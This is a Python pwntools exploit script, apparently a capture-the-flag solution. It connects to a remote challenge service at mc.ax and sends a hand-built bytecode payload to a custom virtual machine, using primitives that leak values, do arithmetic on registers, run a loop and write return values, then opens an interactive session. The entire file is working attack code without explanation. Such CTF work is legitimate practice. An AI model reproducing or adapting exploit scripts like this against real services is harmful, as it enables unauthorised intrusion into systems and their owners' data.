#/usr/bin/python2

from pwn import *

r = remote("mc.ax",31822)
# f = open("x.txt","w")

def leak():
	tmp = "\x21"
	tmp += "\x00" # address
	tmp += "\x00" # method
	
	tmp += "\x21"
	tmp += "\x01" # address
	tmp += "\x00" # method
	
	tmp += "\x21"
	tmp += "\x02" # address
	tmp += "\x00" # method
	
	tmp += "\x21"
	tmp += "\x03" # address
	tmp += "\x00" # method

	return tmp

def arithmetic(index1,index2,method):
	if(method == "add"):
		calc = "\x01"
	elif(method == "sub"):
		calc = "\x02"
	elif(method == "xor"):
		calc = "\x03"
	elif(method == "mul"):
		calc = "\x00"
	elif(method == "mod"):
		calc = "\x05"
	
	tmp = "\x20"
	tmp += "\x02" # method
	tmp += index1 # address

	tmp += "\x20"
	tmp += "\x02" # method
	tmp += index2 # address

	tmp += "\x10"
	tmp += index1 # address
	tmp += calc # value

	tmp += "\x20"
	tmp += "\x02" # method
	tmp += index1 # address

	tmp += "\x21"
	tmp += index1 # 
	tmp += "\x02" # method
	return tmp

def write(address):
	tmp = "\x20"
	tmp += "\x03" # method
	tmp += address # address
	return tmp

def get_value(address):
	tmp = "\x21"
	tmp += address # address return 
	tmp += "\x03" # method
	return tmp

def write_to_reg(address,value):
	tmp = "\x10"
	tmp += address # address
	tmp += value # value
	return tmp

def write_return(address):
	tmp = "\x20"
	tmp += "\x01" # method
	tmp += address # address
	return tmp


def loop(start,finish,op,branch):
	if(op=="lt"):
		tmp = "\x50"
		tmp += start
		tmp += finish 
		tmp += branch
	return tmp

payload = leak()

#v1
payload += arithmetic("\x00","\x03","add") # arr[0] = arr[0] + arr[3]
payload += arithmetic("\x01","\x00","xor") # arr[1] = arr[1] ^ arr[0]
payload += write("\x01")
#v2
payload += arithmetic("\x01","\x00","xor")
payload += arithmetic("\x00","\x03","sub")
payload += arithmetic("\x01","\x00","add")
payload += arithmetic("\x02","\x01","xor")
payload += write("\x02")
#v3
payload += arithmetic("\x02","\x01","xor")
payload += arithmetic("\x01","\x00","sub")
payload += arithmetic("\x02","\x03","add")
payload += arithmetic("\x00","\x02","xor")
payload += write("\x00")
#v4
payload += arithmetic("\x00","\x02","xor")
payload += arithmetic("\x02","\x03","sub")
payload += arithmetic("\x01","\x02","add")
payload += arithmetic("\x03","\x01","xor")
payload += write("\x03")
	
payload += get_value("\x03")
payload += get_value("\x02")
payload += get_value("\x01")
payload += get_value("\x00")

for i in range(0xff):
	payload += write("\x00")
	payload += write("\x01")
	payload += write("\x02")
	payload += write("\x03")

payload += get_value("\x03") # padding

#init
payload += write_to_reg("\x00","\x00")
#loop
# print(len(payload))
payload += write_to_reg("\x03","\x01")
payload += arithmetic("\x00","\x03","add")
payload += get_value("\x01") # junk
payload += get_value("\x01")
payload += arithmetic("\x02","\x01","mul")
payload += get_value("\x03")
payload += arithmetic("\x02","\x03","add")
payload += get_value("\x03")
payload += arithmetic("\x02","\x03","mod")
payload += loop("\x00","\x03","lt","\x0c\xf0")

payload += write_return("\x02")
payload += get_value("\x02") #junk
payload += get_value("\x01")
payload += get_value("\x00")
payload += get_value("\x03")
payload += write_return("\x00")
payload += write_return("\x01")
payload += write_return("\x03")

r.sendline(payload.encode('hex'))
r.interactive()
# f.write(payload)